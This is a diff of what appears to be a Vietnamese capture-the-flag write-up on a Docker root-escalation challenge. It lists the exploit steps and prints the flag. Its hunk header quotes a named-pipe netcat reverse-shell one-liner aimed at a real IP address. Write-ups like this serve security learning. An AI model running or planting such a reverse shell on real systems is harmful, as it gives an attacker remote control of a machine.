@@ -69,7 +69,9 @@ cat /tmp/f|sh -i 2>&1|nc 113.119.181.211 1000 >/tmp/f
 - Nén 3 file trên vào zip rồi up lên sau đó nc ngồi đợi server
 - Đổi tên file docker-entry2  thành docker-entry, để server thực thi docker-entry sau đó sẽ gán quyền egid=1000 cho file thực thi flag2
 - Cuối cùng là ./flag2 và có flag.
+- 
 ![image](https://user-images.githubusercontent.com/82523299/188469974-a4c53d99-5f8d-4ea7-8eb8-ef6a55677d72.png)
+- 
 ![image](https://user-images.githubusercontent.com/82523299/188470169-d81c2569-cec4-4682-b305-bfecf665377f.png)
 
 #### FLAG: BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}
